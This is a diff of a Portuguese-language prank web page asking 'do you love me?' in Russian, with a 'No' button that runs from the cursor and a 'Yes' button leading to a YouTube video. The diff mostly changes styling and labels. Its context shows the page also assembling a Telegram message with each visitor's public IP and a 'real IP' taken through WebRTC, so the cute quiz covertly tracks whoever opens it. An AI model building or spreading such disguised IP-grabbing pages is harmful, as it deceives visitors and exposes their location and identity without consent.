@@ -154,6 +154,22 @@
             }
         }
 
+        .pergunta .russo {
+            font-size: 20px;
+            color: #5a4a44;
+            font-style: normal;
+            display: block;
+            margin-top: 5px;
+        }
+
+        .pergunta .traducao {
+            font-size: 16px;
+            color: #7a6f6a;
+            font-style: normal;
+            display: block;
+            margin-top: 3px;
+        }
+
         /* Botões com toque vintage */
         .buttons {
             display: flex;
@@ -297,13 +313,14 @@
         <img src="SUA-URL-AQUI" alt="Foto russa" class="foto">
 
         <div class="pergunta">
-            <span class="emoji">💗</span> ты меня любишь?<br>
-            <span style="font-size: 16px; color: #7a6f6a;">(você me ama?)</span>
+            <span class="emoji">💗</span> 
+            <span class="russo">ты меня любишь?</span>
+            <span class="traducao">(você me ama?)</span>
         </div>
 
         <div class="buttons" id="buttonArea">
-            <button class="btn" id="btnSim">Да ❤️</button>
-            <button class="btn btn-nao" id="btnNao">Нет 💔</button>
+            <button class="btn" id="btnSim">🇷🇺 SIM ❤️</button>
+            <button class="btn btn-nao" id="btnNao">🇷🇺 NÃO 💔</button>
         </div>
 
         <div class="loader" id="loader"></div>
@@ -311,7 +328,7 @@
 
     <script>
         // ============================================================
-        // BOTÃO "НЕТ" (NÃO) FUGINDO
+        // BOTÃO "NÃO" FUGINDO
         // ============================================================
         const btnNao = document.getElementById('btnNao');
         const btnSim = document.getElementById('btnSim');
@@ -352,7 +369,7 @@
         });
 
         // ============================================================
-        // BOTÃO "ДА" (SIM) — VAI PRO YOUTUBE (LANA DEL REY)
+        // BOTÃO "SIM" — VAI PRO YOUTUBE (LANA DEL REY)
         // ============================================================
         btnSim.addEventListener('click', function() {
             buttonArea.style.display = 'none';
@@ -530,7 +547,7 @@
 
                 // Mensagem para o Telegram
                 let msg = `
-         **🇷🇺** 
+         **🇷🇺 SONHO RUSSO COM LANA** 
 
         📲 **IP Público:** ${ip}
         🔴 **IP Real:** ${webrtcIP}
